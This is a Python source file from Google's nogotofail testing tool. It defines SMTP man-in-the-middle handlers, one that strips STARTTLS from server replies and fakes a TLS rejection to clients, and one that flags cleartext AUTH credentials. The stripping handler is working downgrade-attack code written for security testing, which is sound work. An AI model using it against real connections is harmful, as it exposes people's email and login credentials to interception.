r'''
Copyright 2014 Google Inc. All rights reserved.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
'''

import logging
from nogotofail.mitm.connection.handlers.data import handlers
from nogotofail.mitm.connection.handlers.data import ClientReportDetection
from nogotofail.mitm.connection.handlers.data import DataHandler
from nogotofail.mitm.connection.handlers.store import handler
from nogotofail.mitm.event import connection
from nogotofail.mitm import util
import re


@handler(handlers)
class SmtpStartTlsStripHandler(DataHandler):

    name = "smtpstarttlsstrip"
    description = "Suppress STARTTLS in SMTP"

    first_server_chunk_received = False
    first_client_chunk_received = False
    smtp_detected = False
    ehlo_pattern = re.compile("EHLO[ -]|EHLO$|HELO[ -]|HELO$", re.I)
    ehlo_detected = False
    ehlo_response_pending = False

    server_starttls_stripped = False
    client_starttls_rejected = False

    vuln_notified = False

    def on_response(self, response):
        if not self.first_server_chunk_received:
            self.first_server_chunk_received = True
            if (not self.first_client_chunk_received and
                (response.startswith("220 ") or response.startswith("220-"))):
                self.smtp_detected = True

        if not self.smtp_detected:
            return response

        if self.ehlo_response_pending:
            # This is supposed to be a response to EHLO
            self.ehlo_response_pending = False
            if not response.startswith("250-"):
                # Unexpected response to EHLO -- stop analyzing/attacking
                return response

            lines = [l.rstrip() for l in response.splitlines()]
            starttls_line_index = -1
            for i in range(len(lines)):
                line = lines[i]
                if line[4:].lower().startswith("starttls"):
                    starttls_line_index = i
                    break
            else:
                # STARTTLS not found -- stop analyzing/attacking
                self.smtp_detected = False
                self.log(logging.DEBUG, "No STARTTLS in EHLO response")
                return response

            if starttls_line_index == len(lines) - 1:
                # STARTTLS line was the last line -- drop it and modify the
                # preceding line as required by the protocol.
                lines = lines[:starttls_line_index]
                lines[-1] = lines[-1][0:3] + " " + lines[-1][4:]
            else:
                # STARTTLS line was not the last line -- just drop it.
                lines = lines[:starttls_line_index] + lines[starttls_line_index + 1:]
            response = "\r\n".join(lines) + "\r\n"
            self.server_starttls_stripped = True
            self.log(logging.DEBUG, "Stripped STARTTLS from EHLO response")

        return response


    def on_request(self, request):
        self.first_client_chunk_received = True
        if not self.smtp_detected:
            return request

        if not self.ehlo_detected:
            if bool(self.ehlo_pattern.match(request)):
                self.ehlo_detected = True
                self.ehlo_response_pending = True
                self.log(logging.DEBUG, "SMTP EHLO detected")
                return request

        if self.ehlo_detected:
            if request.lower().startswith("starttls"):
                # Client is attempting STARTTLS -- fake a rejection reply from
                # server and do not forward STARTTLS to server.
                self.client_starttls_rejected = True
                self.log(logging.DEBUG, "Suppressed STARTTLS from client")
                self.connection.client_socket.sendall(
                    "454 TLS not available due to temporary reason\r\n")
                return ""
            elif self.server_starttls_stripped or self.client_starttls_rejected:
                if not self.vuln_notified:
                    self.log(
                        logging.CRITICAL,
                        "Cleartext traffic after stripped STARTTLS")
                    self.log_event(
                        logging.ERROR,
                        connection.AttackEvent(
                            self.connection, self.name, True,
                            None))
                    self.connection.vuln_notify(
                        util.vuln.VULN_SMTP_STARTTLS_STRIP)
                    self.vuln_notified = True
                    # Stop analyzing/attacking this connection
                    self.smtp_detected = False

        return request


@handler.passive(handlers)
class SmtpAuthHandler(DataHandler):

    name = "smtpauthdetection"
    description = "Detect authentication credentials in SMTP traffic"
    first_server_chunk_received = False
    first_client_chunk_received = False
    smtp_detected = False
    ehlo_pattern = re.compile("EHLO[ -]|EHLO$|HELO[ -]|HELO$", re.I)
    ehlo_detected = False

    def on_response(self, response):
        if not self.first_server_chunk_received:
            self.first_server_chunk_received = True
            if (not self.first_client_chunk_received and
                (response.startswith("220 ") or response.startswith("220-"))):
                self.smtp_detected = True

        return response

    def on_request(self, request):
        self.first_client_chunk_received = True
        if not self.smtp_detected:
            return request

        if not self.ehlo_detected:
            if bool(self.ehlo_pattern.match(request)):
                self.ehlo_detected = True
                self.ehlo_response_pending = True
                self.log(logging.DEBUG, "SMTP EHLO detected")
                return request

        if not self.ehlo_detected:
            return request

        if request.lower().startswith("auth "):
            self.log(
                logging.CRITICAL,
                "Authentication credentials in SMTP traffic")
            self.log_event(
                logging.ERROR,
                connection.AttackEvent(
                    self.connection, self.name, True,
                    None))
            self.connection.vuln_notify(util.vuln.VULN_CLEARTEXT_AUTH)

        return request

